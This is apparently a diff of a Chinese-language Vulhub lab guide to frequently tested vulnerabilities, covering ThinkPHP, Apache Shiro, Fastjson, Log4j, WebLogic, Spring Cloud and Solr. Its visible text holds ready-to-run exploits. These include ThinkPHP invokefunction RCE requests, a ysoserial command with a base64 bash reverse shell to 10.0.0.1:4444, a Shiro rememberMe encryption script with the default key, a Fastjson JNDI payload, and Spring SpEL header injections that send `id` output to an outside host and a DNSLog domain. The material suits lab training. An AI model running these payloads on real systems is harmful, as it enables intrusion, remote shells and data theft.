@@ -1,15 +1,15 @@
 # Vulhub 高频漏洞实战 · S 级（企业 SRC / 护网必考）
 ## 总览
-| # | 漏洞 | CVE | 类型 |
-| --- | --- | --- | --- |
-| 1 | ThinkPHP 5.0.23 / 5.1.x RCE | CNVD-2018-24942 | 框架 RCE |
-| 2 | Apache Shiro 1.2.4 反序列化 | CVE-2016-4437 | 反序列化 |
-| 3 | Fastjson 1.2.24 / 1.2.47 JNDI | CVE-2017-18349 / 无CVE | 反序列化 |
-| 4 | Log4j2 log4shell | CVE-2021-44228 | JNDI 注入 |
-| 5 | WebLogic T3 / wls9-async | CVE-2018-2628 / CVE-2019-2725 | 反序列化 |
-| 6 | Spring Cloud Function SpEL | CVE-2022-22963 | 表达式注入 |
-| 7 | Spring Cloud Gateway | CVE-2022-22947 | 表达式注入 |
-| 8 | Apache Solr Velocity | CVE-2019-17558 | SSTI |
+| #   | 漏洞                            | CVE                           | 类型      |
+| --- | ----------------------------- | ----------------------------- | ------- |
+| 1   | ThinkPHP 5.0.23 / 5.1.x RCE   | CNVD-2018-24942               | 框架 RCE  |
+| 2   | Apache Shiro 1.2.4 反序列化       | CVE-2016-4437                 | 反序列化    |
+| 3   | Fastjson 1.2.24 / 1.2.47 JNDI | CVE-2017-18349 / 无CVE         | 反序列化    |
+| 4   | Log4j2 log4shell              | CVE-2021-44228                | JNDI 注入 |
+| 5   | WebLogic T3 / wls9-async      | CVE-2018-2628 / CVE-2019-2725 | 反序列化    |
+| 6   | Spring Cloud Function SpEL    | CVE-2022-22963                | 表达式注入   |
+| 7   | Spring Cloud Gateway          | CVE-2022-22947                | 表达式注入   |
+| 8   | Apache Solr Velocity          | CVE-2019-17558                | SSTI    |
 
 
 ---
@@ -61,9 +61,7 @@ Burp Suite / nc / curl / dig / nslookup
 | 5.0.0 - 5.0.23 | RCE | 路由 1 |
 | 5.1.0 - 5.1.30 | RCE | 路由 2 |
 
-
 **利用条件**：
-
 + 默认配置即可触发
 + 无需任何认证
 + 只需要 Web 端口可达
@@ -79,7 +77,6 @@ curl http://localhost:8080/
 
 ### 1.4.2 漏洞检测
 **5.0.x Payload**：
-
 ```bash
 curl "http://localhost:8080/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1"
 ```
@@ -123,7 +120,6 @@ curl "http://target/index.php?s=index/\think\Container/invokefunction&function=c
 # 第 2 关 Apache Shiro 1.2.4 反序列化（CVE-2016-4437）
 ## 2.1 产品介绍
 **Apache Shiro** 是 Java 生态流行的权限/认证框架，提供：
-
 + 认证（Authentication）
 + 授权（Authorization）
 + 加密（Cryptography）
@@ -133,7 +129,6 @@ curl "http://target/index.php?s=index/\think\Container/invokefunction&function=c
 
 ## 2.2 漏洞背景
 2016 年安全研究员 Jasmin Blanchette 披露：
-
 + Shiro 默认使用 Cookie 字段 `rememberMe` 记住用户登录状态
 + 流程：用户对象 → 序列化 → **AES-CBC 加密** → Base64 → Cookie
 + **致命点**：默认 AES 密钥硬编码在源码里：`kPH+bIxk5D2deZiIxcaaaA==`
@@ -148,9 +143,7 @@ curl "http://target/index.php?s=index/\think\Container/invokefunction&function=c
 | Shiro 1.2.5 - 1.4.1 | 默认 key 已改，但用户可能改回旧 key |
 | Shiro ≥ 1.4.2 | 改用 AES-GCM，密钥每次启动随机 |
 
-
 **利用条件**：
-
 + 应用使用 `rememberMe` 功能
 + AES key 是默认值或可爆破出来
 + 服务端 classpath 中存在可用 gadget（CommonsCollections / CommonsBeanutils 等）
@@ -165,7 +158,6 @@ docker-compose up -d
 
 ### 2.4.2 指纹识别
 登录请求响应头会包含：
-
 ```plain
 Set-Cookie: rememberMe=deleteMe; Path=/jenkins
 ```
@@ -181,7 +173,6 @@ java -jar ShiroExploit.jar
 ```
 
 或使用命令行工具：
-
 ```bash
 git clone https://github.com/feihong-cs/shiro-550-without-urldns.git
 ```
@@ -190,14 +181,12 @@ git clone https://github.com/feihong-cs/shiro-550-without-urldns.git
 1. **爆破 AES key**（默认 `kPH+bIxk5D2deZiIxcaaaA==`）
 2. **检测可用 gadget**：用 URLDNS 探测 classpath
 3. **生成 payload**：
-
 ```bash
 # 用 ysoserial 生成 CommonsBeanutils1 链
 java -jar ysoserial.jar CommonsBeanutils1 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}" > payload.bin
 ```
 
 4. **用 Shiro key 加密 payload**：
-
 ```python
 # shiro_encrypt.py
 import base64, uuid
@@ -217,13 +206,11 @@ print(base64.b64encode(ct).decode())
 ```
 
 5. **发送请求**：
-
 ```bash
 curl -H "Cookie: rememberMe=$(python shiro_encrypt.py)" http://target/
 ```
 
 6. **接收反弹 shell**（攻击者监听）：
-
 ```bash
 nc -lvnp 4444
 ```
@@ -268,7 +255,6 @@ Fastjson 的 `@type` 字段允许指定反序列化的目标类，框架会调�
 | 1.2.68+ | safeMode | 默认安全 |
 | 1.2.83+ | safeMode 默认开启 | 强烈建议升级 |
 
-
 **利用条件**：
 + 服务端用 fastjson 解析用户可控的 JSON
 + Java 版本 < 8u191（JNDI 远程加载）或使用本地 gadget（TemplatesImpl）
@@ -294,7 +280,6 @@ java -jar target/JNDI-Injection-Exploit-1.0-SNAPSHOT-jar-with-dependencies.jar \
 ```
 
 输出几个可用的 JNDI URL，例如：
-
 ```plain
 rmi://10.0.0.1:1099/abc123
 ldap://10.0.0.1:1389/abc123
@@ -313,7 +298,6 @@ Content-Type: application/json
 ```
 
 服务端反序列化时：
-
 + `setDataSourceName("ldap://...")` 设置 JNDI URL
 + `setAutoCommit(true)` 触发 `connect()` → JNDI lookup
 + 攻击者 RMI/LDAP 服务返回恶意 Java 类 → 加载执行
@@ -627,14 +611,12 @@ curl -H "spring.cloud.function.routing-expression: T(java.lang.Runtime).getRunti
 
 ### 6.4.3 回显利用
 由于 `exec()` 不回显，用 `ProcessBuilder` + 读取流：
-
 ```bash
 curl -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(new String[]{"bash","-c","curl http://10.0.0.1:8080/$(id|base64)"})' \
      http://target:8080/uppercase -d "test"
 ```
 
 DNSLog 版：
-
 ```bash
 curl -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(new String[]{"bash","-c","ping -c 1 `id`.dnslog.cn"})' \
      http://target:8080/uppercase -d "test"
@@ -695,9 +677,7 @@ POST /actuator/gateway/routes/pwn
 | 3.1.1+ / 3.0.7+ | 已修复 |
 
 
-**利用条件**：
-
-+ 暴露了 Actuator 端点（默认关闭，但运维常开）
+**利用条件**：暴露了 Actuator 端点（默认关闭，但运维常开）
 
 ## 7.4 复现过程
 ### 7.4.1 启动环境
